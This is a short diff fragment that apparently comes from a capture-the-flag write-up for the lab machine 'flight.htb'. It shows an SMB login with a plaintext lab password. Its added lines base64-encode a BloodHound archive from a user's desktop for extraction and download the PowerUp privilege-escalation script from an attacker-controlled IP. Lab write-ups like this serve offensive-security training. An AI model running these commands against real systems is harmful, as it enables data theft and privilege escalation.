@@ -49,11 +49,11 @@ smbclient //flight.htb/Web -u C.Bum 'Tikkycoll_431012284'
 ```
 
 ```
-
+powershell -c "[Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\C.Bum\Desktop\20260912173225_BloodHound.zip'))"
 ```
 
 ```
-
+powershell wget http://10.10.17.95/PowerUp.ps1 -OutFile C:\Users\C.Bum\Desktop\PowerUp.ps1
 ```
 
 ```
